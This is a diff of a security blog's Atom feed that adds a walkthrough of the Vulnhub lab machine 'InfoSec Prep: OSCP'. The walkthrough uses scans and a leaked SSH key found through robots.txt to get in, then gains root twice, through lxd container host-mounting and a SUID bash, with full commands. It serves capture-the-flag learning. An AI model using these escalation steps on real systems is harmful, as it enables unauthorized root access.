@@ -1,5 +1,215 @@
 <?xml version="1.0" encoding="utf-8"?>
-<feed xmlns="http://www.w3.org/2005/Atom"><title>maggick's logs</title><link href="https://maggick.fr/" rel="alternate"></link><link href="https://maggick.fr/feeds/all-en.atom.xml" rel="self"></link><id>https://maggick.fr/</id><updated>2020-07-26T09:30:00+02:00</updated><entry><title>HTB: Cascade</title><link href="https://maggick.fr/2020/07/htb-cascade.html" rel="alternate"></link><published>2020-07-26T09:30:00+02:00</published><updated>2020-07-26T09:30:00+02:00</updated><author><name>maggick</name></author><id>tag:maggick.fr,2020-07-26:/2020/07/htb-cascade.html</id><summary type="html">&lt;p&gt;&lt;img alt="Cascade Card" class="align-left" src="/media/2020.07/cascade_card.png" width="262"/&gt;&lt;/p&gt;
+<feed xmlns="http://www.w3.org/2005/Atom"><title>maggick's logs</title><link href="https://maggick.fr/" rel="alternate"></link><link href="https://maggick.fr/feeds/all-en.atom.xml" rel="self"></link><id>https://maggick.fr/</id><updated>2020-08-10T10:35:00+02:00</updated><entry><title>Vulnhub: InfoSec Prep: OSCP</title><link href="https://maggick.fr/2020/08/vulnhub-infosec-prep-oscp.html" rel="alternate"></link><published>2020-08-10T10:35:00+02:00</published><updated>2020-08-10T10:35:00+02:00</updated><author><name>maggick</name></author><id>tag:maggick.fr,2020-08-10:/2020/08/vulnhub-infosec-prep-oscp.html</id><summary type="html">&lt;p&gt;&lt;img alt="Book card" class="align-left" src="/media/2020.08/prep_oscp.png" width="262"/&gt;&lt;/p&gt;
+&lt;p&gt;This is a writeup about a vulnhub machine
+&lt;a href="https://www.vulnhub.com/entry/infosec-prep-oscp,508/"&gt;InfoSec Prep&lt;/a&gt;
+This box is an really easy box in order to make a small selection for entering a
+give away for a 30d voucher to the OSCP Lab, Lab materials, and an exam attempt.
+The box was created by
+&lt;a href="https://www.vulnhub.com/author/falconspy,646/"&gt;FalconSpy&lt;/a&gt; and publish on July
+11 2020.
+It involves a &lt;code&gt;robots.txt&lt;/code&gt; file, some base64 an SSH key, lxd and a SUID binary.&lt;/p&gt;
+</summary><content type="html">&lt;p&gt;&lt;img class="align-left" src="/media/2020.08/prep_oscp.png" alt="Book card" width="262"&gt;&lt;/p&gt;
+&lt;p&gt;This is a writeup about a vulnhub machine
+&lt;a href="https://www.vulnhub.com/entry/infosec-prep-oscp,508/"&gt;InfoSec Prep&lt;/a&gt;
+This box is an really easy box in order to make a small selection for entering a
+give away for a 30d voucher to the OSCP Lab, Lab materials, and an exam attempt.
+The box was created by
+&lt;a href="https://www.vulnhub.com/author/falconspy,646/"&gt;FalconSpy&lt;/a&gt; and publish on July
+11 2020.
+It involves a &lt;code&gt;robots.txt&lt;/code&gt; file, some base64 an SSH key, lxd and a SUID binary.&lt;/p&gt;
+
+
+&lt;h1 id="user"&gt;User&lt;/h1&gt;
+&lt;h2 id="nmap"&gt;nmap&lt;/h2&gt;
+&lt;p&gt;We start with an nmap scan. Only the ports 22 (SSH), 80 (HTTP) and 33060 (??) are open.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;# Nmap 7.80 scan initiated Sat Jul 18 04:31:34 2020 as: nmap -p- -sSV -oN nmap_tcp 192.168.1.200&lt;/span&gt;
+&lt;span class="code-line"&gt;Nmap scan report for oscp.home (192.168.1.200)&lt;/span&gt;
+&lt;span class="code-line"&gt;Host is up (0.00093s latency).&lt;/span&gt;
+&lt;span class="code-line"&gt;Not shown: 65532 closed ports&lt;/span&gt;
+&lt;span class="code-line"&gt;PORT      STATE SERVICE VERSION&lt;/span&gt;
+&lt;span class="code-line"&gt;22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)&lt;/span&gt;
+&lt;span class="code-line"&gt;80/tcp    open  http    Apache httpd 2.4.41 ((Ubuntu))&lt;/span&gt;
+&lt;span class="code-line"&gt;33060/tcp open  mysqlx?&lt;/span&gt;
+&lt;span class="code-line"&gt;1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :&lt;/span&gt;
+&lt;span class="code-line"&gt;SF-Port33060-TCP:V=7.80%I=7%D=7/17%Time=5F1161EE%P=x86_64-pc-linux-gnu%r(N&lt;/span&gt;
+&lt;span class="code-line"&gt;SF:ULL,9,&amp;quot;\x05\0\0\0\x0b\x08\x05\x1a\0&amp;quot;)%r(GenericLines,9,&amp;quot;\x05\0\0\0\x0b\&lt;/span&gt;
+&lt;span class="code-line"&gt;SF:x08\x05\x1a\0&amp;quot;)%r(GetRequest,9,&amp;quot;\x05\0\0\0\x0b\x08\x05\x1a\0&amp;quot;)%r(HTTPOp&lt;/span&gt;
+&lt;span class="code-line"&gt;SF:tions,9,&amp;quot;\x05\0\0\0\x0b\x08\x05\x1a\0&amp;quot;)%r(RTSPRequest,9,&amp;quot;\x05\0\0\0\x0b&lt;/span&gt;
+&lt;span class="code-line"&gt;SF:\x08\x05\x1a\0&amp;quot;)%r(RPCCheck,9,&amp;quot;\x05\0\0\0\x0b\x08\x05\x1a\0&amp;quot;)%r(DNSVers&lt;/span&gt;
+&lt;span class="code-line"&gt;SF:ionBindReqTCP,9,&amp;quot;\x05\0\0\0\x0b\x08\x05\x1a\0&amp;quot;)%r(DNSStatusRequestTCP,2&lt;/span&gt;
+&lt;span class="code-line"&gt;SF:B,&amp;quot;\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88&amp;#39;\x1a\x0fI&lt;/span&gt;
+&lt;span class="code-line"&gt;SF:nvalid\x20message\&amp;quot;\x05HY000&amp;quot;)%r(Help,9,&amp;quot;\x05\0\0\0\x0b\x08\x05\x1a\0&amp;quot;)&lt;/span&gt;
+&lt;span class="code-line"&gt;SF:%r(SSLSessionReq,2B,&amp;quot;\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01&lt;/span&gt;
+&lt;span class="code-line"&gt;SF:\x10\x88&amp;#39;\x1a\x0fInvalid\x20message\&amp;quot;\x05HY000&amp;quot;)%r(TerminalServerCookie&lt;/span&gt;
+&lt;span class="code-line"&gt;SF:,9,&amp;quot;\x05\0\0\0\x0b\x08\x05\x1a\0&amp;quot;)%r(TLSSessionReq,2B,&amp;quot;\x05\0\0\0\x0b\x&lt;/span&gt;
+&lt;span class="code-line"&gt;SF:08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88&amp;#39;\x1a\x0fInvalid\x20message\&amp;quot;&lt;/span&gt;
+&lt;span class="code-line"&gt;SF:\x05HY000&amp;quot;)%r(Kerberos,9,&amp;quot;\x05\0\0\0\x0b\x08\x05\x1a\0&amp;quot;)%r(SMBProgNeg,9&lt;/span&gt;
+&lt;span class="code-line"&gt;SF:,&amp;quot;\x05\0\0\0\x0b\x08\x05\x1a\0&amp;quot;)%r(X11Probe,2B,&amp;quot;\x05\0\0\0\x0b\x08\x05\&lt;/span&gt;
+&lt;span class="code-line"&gt;SF:x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88&amp;#39;\x1a\x0fInvalid\x20message\&amp;quot;\x05HY0&lt;/span&gt;
+&lt;span class="code-line"&gt;SF:00&amp;quot;)%r(FourOhFourRequest,9,&amp;quot;\x05\0\0\0\x0b\x08\x05\x1a\0&amp;quot;)%r(LPDString,&lt;/span&gt;
+&lt;span class="code-line"&gt;SF:9,&amp;quot;\x05\0\0\0\x0b\x08\x05\x1a\0&amp;quot;)%r(LDAPSearchReq,2B,&amp;quot;\x05\0\0\0\x0b\x0&lt;/span&gt;
+&lt;span class="code-line"&gt;SF:8\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88&amp;#39;\x1a\x0fInvalid\x20message\&amp;quot;\&lt;/span&gt;
+&lt;span class="code-line"&gt;SF:x05HY000&amp;quot;)%r(LDAPBindReq,9,&amp;quot;\x05\0\0\0\x0b\x08\x05\x1a\0&amp;quot;)%r(SIPOptions&lt;/span&gt;
+&lt;span class="code-line"&gt;SF:,9,&amp;quot;\x05\0\0\0\x0b\x08\x05\x1a\0&amp;quot;)%r(LANDesk-RC,9,&amp;quot;\x05\0\0\0\x0b\x08\x&lt;/span&gt;
+&lt;span class="code-line"&gt;SF:05\x1a\0&amp;quot;)%r(TerminalServer,9,&amp;quot;\x05\0\0\0\x0b\x08\x05\x1a\0&amp;quot;)%r(NCP,9,&amp;quot;&lt;/span&gt;
+&lt;span class="code-line"&gt;SF:\x05\0\0\0\x0b\x08\x05\x1a\0&amp;quot;)%r(NotesRPC,2B,&amp;quot;\x05\0\0\0\x0b\x08\x05\x1&lt;/span&gt;
+&lt;span class="code-line"&gt;SF:a\0\x1e\0\0\0\x01\x08\x01\x10\x88&amp;#39;\x1a\x0fInvalid\x20message\&amp;quot;\x05HY000&lt;/span&gt;
+&lt;span class="code-line"&gt;SF:&amp;quot;)%r(JavaRMI,9,&amp;quot;\x05\0\0\0\x0b\x08\x05\x1a\0&amp;quot;)%r(WMSRequest,9,&amp;quot;\x05\0\0&lt;/span&gt;
+&lt;span class="code-line"&gt;SF:\0\x0b\x08\x05\x1a\0&amp;quot;)%r(oracle-tns,9,&amp;quot;\x05\0\0\0\x0b\x08\x05\x1a\0&amp;quot;)%r&lt;/span&gt;
+&lt;span class="code-line"&gt;SF:(ms-sql-s,9,&amp;quot;\x05\0\0\0\x0b\x08\x05\x1a\0&amp;quot;)%r(afp,2B,&amp;quot;\x05\0\0\0\x0b\x0&lt;/span&gt;
+&lt;span class="code-line"&gt;SF:8\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88&amp;#39;\x1a\x0fInvalid\x20message\&amp;quot;\&lt;/span&gt;
+&lt;span class="code-line"&gt;SF:x05HY000&amp;quot;)%r(giop,9,&amp;quot;\x05\0\0\0\x0b\x08\x05\x1a\0&amp;quot;);&lt;/span&gt;
+&lt;span class="code-line"&gt;Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;h2 id="web"&gt;Web&lt;/h2&gt;
+&lt;p&gt;On port 80 we found a classic wordpress blog. We run a wpscan on it but nothing
+pop out. We run a nikto on the box. It found an entry &lt;code&gt;/secret.txt&lt;/code&gt; on the
+&lt;code&gt;robots.txt&lt;/code&gt; file.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;kali@kali:~$ nikto -h 192.168.1.200&lt;/span&gt;
+&lt;span class="code-line"&gt;- Nikto v2.1.6&lt;/span&gt;
+&lt;span class="code-line"&gt;---------------------------------------------------------------------------&lt;/span&gt;
+&lt;span class="code-line"&gt;+ Target IP:          192.168.1.200&lt;/span&gt;
+&lt;span class="code-line"&gt;+ Target Hostname:    192.168.1.200&lt;/span&gt;
+&lt;span class="code-line"&gt;+ Target Port:        80&lt;/span&gt;
+&lt;span class="code-line"&gt;+ Start Time:         2020-07-18 08:12:31 (GMT-4)&lt;/span&gt;
+&lt;span class="code-line"&gt;---------------------------------------------------------------------------&lt;/span&gt;
+&lt;span class="code-line"&gt;+ Server: Apache/2.4.41 (Ubuntu)&lt;/span&gt;
+&lt;span class="code-line"&gt;+ RFC-1918 IP address found in the &amp;#39;link&amp;#39; header. The IP is &amp;quot;10.244.168.1&amp;quot;.&lt;/span&gt;
+&lt;span class="code-line"&gt;+ The anti-clickjacking X-Frame-Options header is not present.&lt;/span&gt;
+&lt;span class="code-line"&gt;+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS&lt;/span&gt;
+&lt;span class="code-line"&gt;+ Uncommon header &amp;#39;link&amp;#39; found, with contents: &amp;lt;http://192.168.1.200http://10.244.168.1/index.php/wp-json/&amp;gt;; rel=&amp;quot;https://api.w.org/&amp;quot;&lt;/span&gt;
+&lt;span class="code-line"&gt;+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type&lt;/span&gt;
+&lt;span class="code-line"&gt;+ Uncommon header &amp;#39;x-redirect-by&amp;#39; found, with contents: WordPress&lt;/span&gt;
+&lt;span class="code-line"&gt;+ No CGI Directories found (use &amp;#39;-C all&amp;#39; to force check all possible dirs)&lt;/span&gt;
+&lt;span class="code-line"&gt;+ Entry &amp;#39;/secret.txt&amp;#39; in robots.txt returned a non-forbidden or redirect HTTP code (200)&lt;/span&gt;
+&lt;span class="code-line"&gt;+ Web Server returns a valid response with junk HTTP methods, this may cause false positives.&lt;/span&gt;
+&lt;span class="code-line"&gt;&amp;lt;SNIP&amp;gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;The file is a RSA private key encoded in base64. Once decoded we store it in a
+&lt;code&gt;ssh_key&lt;/code&gt; file.&lt;/p&gt;
+&lt;p&gt;We just need to know what the user is. We continue to browse the website and
+display the &lt;code&gt;admin&lt;/code&gt; user page (http://192.168.1.200/index.php/author/admin/) it
+state that the only use on the box is &lt;code&gt;oscp&lt;/code&gt; so we connect on SSH as &lt;code&gt;oscp&lt;/code&gt; using
+SSH key.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;kali@kali:~$ ssh oscp@192.168.1.200 -i id_rsa &lt;/span&gt;
+&lt;span class="code-line"&gt;Welcome to Ubuntu 20.04 LTS (GNU/Linux 5.4.0-40-generic x86_64)&lt;/span&gt;
+&lt;span class="code-line"&gt;&amp;lt;SNIP&amp;gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;-bash-5.0$&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;h1 id="root"&gt;Root&lt;/h1&gt;
+&lt;p&gt;I found two ways to get root. The first one (unintended) with &lt;code&gt;lxc&lt;/code&gt; and the
+second one with an SUID binary.&lt;/p&gt;
+&lt;h2 id="lxc"&gt;lxc&lt;/h2&gt;
+&lt;p&gt;Once we have a shell on the box we run &lt;code&gt;id&lt;/code&gt; and found out that we are part of
+the &lt;code&gt;lxd&lt;/code&gt; group. This is a know privilege escalation.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;~ # -bash-5.0$ id&lt;/span&gt;
+&lt;span class="code-line"&gt;uid=1000(oscp) gid=1000(oscp) groups=1000(oscp),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lxd)&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;When we try to run the &lt;code&gt;lxc&lt;/code&gt; (or &lt;code&gt;lxd&lt;/code&gt;) command we got an error &lt;code&gt;command not
+found&lt;/code&gt; so we run a quick search in order to find the binary path.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;-bash-5.0$ lxc&lt;/span&gt;
+&lt;span class="code-line"&gt;-bash: lxc: command not found&lt;/span&gt;
+&lt;span class="code-line"&gt;-bash-5.0$ find / -name &amp;#39;lxc&amp;#39; 2&amp;gt; /dev/null&lt;/span&gt;
+&lt;span class="code-line"&gt;/snap/lxd/16100/bin/lxc&lt;/span&gt;
+&lt;span class="code-line"&gt;/snap/lxd/16100/commands/lxc&lt;/span&gt;
+&lt;span class="code-line"&gt;/snap/lxd/16100/lxc&lt;/span&gt;
+&lt;span class="code-line"&gt;/snap/lxd/16044/bin/lxc&lt;/span&gt;
+&lt;span class="code-line"&gt;/snap/lxd/16044/commands/lxc&lt;/span&gt;
+&lt;span class="code-line"&gt;/snap/lxd/16044/lxc&lt;/span&gt;
+&lt;span class="code-line"&gt;/snap/bin/lxc&lt;/span&gt;
+&lt;span class="code-line"&gt;/usr/share/bash-completion/completions/lxc&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Then we build clone the alipne image and build it on our system (as it require
+root permission), then we transfer it to the box.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;kali@kali:~$ git clone https://github.com/saghul/lxd-alpine-builder&lt;/span&gt;
+&lt;span class="code-line"&gt;kali@kali:~$ cd lxd-alpine-builder/&lt;/span&gt;
+&lt;span class="code-line"&gt;kali@kali:~lxd-alpine-builder$ sudo ./build-alpine -a i686&lt;/span&gt;
+&lt;span class="code-line"&gt;Determining the latest release... v3.12&lt;/span&gt;
+&lt;span class="code-line"&gt;Using static apk from http://dl-cdn.alpinelinux.org/alpine//v3.12/main/x86&lt;/span&gt;
+&lt;span class="code-line"&gt;Downloading alpine-keys-2.2-r0.apk&lt;/span&gt;
+&lt;span class="code-line"&gt;tar: Ignoring unknown extended header keyword &amp;#39;APK-TOOLS.checksum.SHA1&amp;#39;&lt;/span&gt;
+&lt;span class="code-line"&gt;&amp;lt;SNIP&amp;gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;18/19) Installing alpine-keys (2.2-r0)&lt;/span&gt;
+&lt;span class="code-line"&gt;(19/19) Installing alpine-base (3.12.0-r0)&lt;/span&gt;
+&lt;span class="code-line"&gt;Executing busybox-1.31.1-r19.trigger&lt;/span&gt;
+&lt;span class="code-line"&gt;OK: 8 MiB in 19 packages&lt;/span&gt;
+&lt;span class="code-line"&gt;kali@kali:~lxd-alpine-builder$ scp -i id_rsa alpine-v3.12-i686-20200717_0532.tar.gz oscp@192.168.1.200:&lt;/span&gt;
+&lt;span class="code-line"&gt;alpine-v3.12-i686-20200717_0532.tar.gz&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Then we try to import the image in the box. We first need to initialize &lt;code&gt;lxd&lt;/code&gt;.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;-bash-5.0$ /snap/bin/lxc image import ./alpine-v3.12-i686-20200717_0532.tar.gz --alias myimage&lt;/span&gt;
+&lt;span class="code-line"&gt;If this is your first time running LXD on this machine, you should also run: lxd init&lt;/span&gt;
+&lt;span class="code-line"&gt;To start your first instance, try: lxc launch ubuntu:18.04&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;Image imported with fingerprint: dcf00931e4bc5f738cb5d843593151420e4c27cf7c8152a3b91ec6c75bf4db6d&lt;/span&gt;
+&lt;span class="code-line"&gt;-bash-5.0$ /snap/bin/lxc init myimage mycontainer -c security.privileged=true&lt;/span&gt;
+&lt;span class="code-line"&gt;Creating mycontainer&lt;/span&gt;
+&lt;span class="code-line"&gt;Error: No storage pool found. Please create a new storage pool&lt;/span&gt;
+&lt;span class="code-line"&gt;-bash-5.0$ /snap/bin/lxd init&lt;/span&gt;
+&lt;span class="code-line"&gt;Would you like to use LXD clustering? (yes/no) [default=no]:&lt;/span&gt;
+&lt;span class="code-line"&gt;Do you want to configure a new storage pool? (yes/no) [default=yes]:&lt;/span&gt;
+&lt;span class="code-line"&gt;&amp;lt;SNIP&amp;gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;Would you like a YAML &amp;quot;lxd init&amp;quot; preseed to be printed? (yes/no) [default=no]:&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Then we just boot the image, mounting the host disk and access the root flag.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;-bash-5.0$ /snap/bin/lxc init myimage mycontainer -c security.privileged=true&lt;/span&gt;
+&lt;span class="code-line"&gt;Creating mycontainer&lt;/span&gt;
+&lt;span class="code-line"&gt;-bash-5.0$ /snap/bin/lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true&lt;/span&gt;
+&lt;span class="code-line"&gt;Device mydevice added to mycontainer&lt;/span&gt;
+&lt;span class="code-line"&gt;-bash-5.0$ /snap/bin/lxc  start mycontainer&lt;/span&gt;
+&lt;span class="code-line"&gt;-bash-5.0$ /snap/bin/lxc exec mycontainer /bin/sh&lt;/span&gt;
+&lt;span class="code-line"&gt;~ # ls /mnt/root/&lt;/span&gt;
+&lt;span class="code-line"&gt;bin         cdrom       etc         lib         lib64       lost+found  mnt         proc        run         snap        swap.img    tmp         var&lt;/span&gt;
+&lt;span class="code-line"&gt;boot        dev         home        lib32       libx32      media       opt         root        sbin        srv         sys         usr&lt;/span&gt;
+&lt;span class="code-line"&gt;~ # ls /mnt/root/root/&lt;/span&gt;
+&lt;span class="code-line"&gt;fix-wordpress  flag.txt       snap&lt;/span&gt;
+&lt;span class="code-line"&gt;~ # ls /mnt/root/root/flag.txt&lt;/span&gt;
+&lt;span class="code-line"&gt;/mnt/root/root/flag.txt&lt;/span&gt;
+&lt;span class="code-line"&gt;~ # cat /mnt/root/root/flag.txt&lt;/span&gt;
+&lt;span class="code-line"&gt;d73b04b0e696b0945283defa3eee4538&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;h2 id="suid-bash"&gt;SUID bash&lt;/h2&gt;
+&lt;p&gt;We can also list the SUID binary and found that &lt;code&gt;/usr/bin/bash&lt;/code&gt; is SUID.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;-bash-5.0$ find / -uid 0 -perm -4000 -type f 2&amp;gt;/dev/null&lt;/span&gt;
+&lt;span class="code-line"&gt;&amp;lt;SNIP&amp;gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;/usr/bin/sudo&lt;/span&gt;
+&lt;span class="code-line"&gt;/usr/bin/chfn&lt;/span&gt;
+&lt;span class="code-line"&gt;/usr/bin/bash&lt;/span&gt;
+&lt;span class="code-line"&gt;/usr/bin/pkexec&lt;/span&gt;
+&lt;span class="code-line"&gt;/usr/bin/umount&lt;/span&gt;
+&lt;span class="code-line"&gt;/usr/bin/chsh&lt;/span&gt;
+&lt;span class="code-line"&gt;/usr/bin/su&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;We just use the &lt;code&gt;-p&lt;/code&gt; option in order to have a shell as root.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;-bash-5.0$ bash -p&lt;/span&gt;
+&lt;span class="code-line"&gt;bash-5.0# id&lt;/span&gt;
+&lt;span class="code-line"&gt;uid=1000(oscp) gid=1000(oscp) euid=0(root) egid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lxd),1000(oscp)&lt;/span&gt;
+&lt;span class="code-line"&gt;bash-5.0# cat /root/flag.txt&lt;/span&gt;
+&lt;span class="code-line"&gt;d73b04b0e696b0945283defa3eee4538&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;h1 id="wrapping-up"&gt;Wrapping up&lt;/h1&gt;
+&lt;p&gt;The box was really easy, a nice job from FalconSpy as it will allow "beginners"
+to enter the give away.&lt;/p&gt;</content><category term="security"></category><category term="security"></category><category term="boot2root"></category><category term="vulnhub"></category><category term="Linux"></category><category term="lxd"></category><category term="lxc"></category></entry><entry><title>HTB: Cascade</title><link href="https://maggick.fr/2020/07/htb-cascade.html" rel="alternate"></link><published>2020-07-26T09:30:00+02:00</published><updated>2020-07-26T09:30:00+02:00</updated><author><name>maggick</name></author><id>tag:maggick.fr,2020-07-26:/2020/07/htb-cascade.html</id><summary type="html">&lt;p&gt;&lt;img alt="Cascade Card" class="align-left" src="/media/2020.07/cascade_card.png" width="262"/&gt;&lt;/p&gt;
 &lt;p&gt;This box is a writeup about a retired HacktheBox machine:
 &lt;a href="https://www.hackthebox.eu/home/machines/profile/235"&gt;Cascade&lt;/a&gt; publish on
 Mars 28 2020 by
@@ -500,7 +710,7 @@ it worked and I was able to get the root flag..&lt;/p&gt;
 &lt;h2 id="wrapping-up"&gt;Wrapping up&lt;/h2&gt;
 &lt;p&gt;This box was fun as there was a lot of different stuff and everything went
 smoothly. The only painful part is the dig into the &lt;code&gt;ldapsearch&lt;/code&gt; results as the
-file is quit long (6 363 lines).&lt;/p&gt;</content><category term="security"></category><category term="security"></category><category term="boot2root"></category><category term="HTB"></category><category term="Windows"></category><category term="LDAP"></category><category term="VNC"></category><category term="AD Recycle bin"></category></entry><entry><title>HTB: Sauna</title><link href="https://maggick.fr/2020/07/htb-sauna.html" rel="alternate"></link><published>2020-07-22T09:35:00+02:00</published><updated>2020-07-22T09:35:00+02:00</updated><author><name>maggick</name></author><id>tag:maggick.fr,2020-07-22:/2020/07/htb-sauna.html</id><summary type="html">&lt;p&gt;&lt;img alt="Craft card" class="align-left" src="/media/2020.07/sauna_card.png" width="262"/&gt;&lt;/p&gt;
+file is quit long (6 363 lines).&lt;/p&gt;</content><category term="security"></category><category term="security"></category><category term="boot2root"></category><category term="HTB"></category><category term="Windows"></category><category term="LDAP"></category><category term="VNC"></category><category term="AD Recycle bin"></category></entry><entry><title>HTB: Sauna</title><link href="https://maggick.fr/2020/07/htb-sauna.html" rel="alternate"></link><published>2020-07-22T09:35:00+02:00</published><updated>2020-07-22T09:35:00+02:00</updated><author><name>maggick</name></author><id>tag:maggick.fr,2020-07-22:/2020/07/htb-sauna.html</id><summary type="html">&lt;p&gt;&lt;img alt="Sauna card" class="align-left" src="/media/2020.07/sauna_card.png" width="262"/&gt;&lt;/p&gt;
 &lt;p&gt;This is a writeup about a retired HacktheBox machine:
 &lt;a href="https://www.hackthebox.eu/home/machines/profile/229"&gt;Sauna&lt;/a&gt; published on
 February the 15th 2020 by
@@ -509,7 +719,7 @@ This box is classified as an easy machine. This box has a lot of similarities
 with &lt;a href="https://maggick.fr/2020/03/htb-forest.html"&gt;forest&lt;/a&gt;: The user part require some smart enumeration. The
 second user also require to enumerate the box and the root part is a "simple"
 exploitation of the second user's privileges.&lt;/p&gt;
-</summary><content type="html">&lt;p&gt;&lt;img class="align-left" src="/media/2020.07/sauna_card.png" alt="Craft card" width="262"&gt;&lt;/p&gt;
+</summary><content type="html">&lt;p&gt;&lt;img class="align-left" src="/media/2020.07/sauna_card.png" alt="Sauna card" width="262"&gt;&lt;/p&gt;
 &lt;p&gt;This is a writeup about a retired HacktheBox machine:
 &lt;a href="https://www.hackthebox.eu/home/machines/profile/229"&gt;Sauna&lt;/a&gt; published on
 February the 15th 2020 by
